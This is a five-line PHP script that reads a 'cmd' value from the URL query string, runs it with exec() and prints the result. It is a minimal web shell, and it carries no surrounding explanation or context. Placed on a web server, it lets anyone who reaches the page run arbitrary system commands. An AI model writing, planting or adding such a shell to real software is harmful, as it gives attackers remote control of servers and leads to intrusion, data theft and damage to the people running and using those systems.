<?php 
$test = $_GET['cmd']; 
$output = exec($test); 
var_dump($output);
?>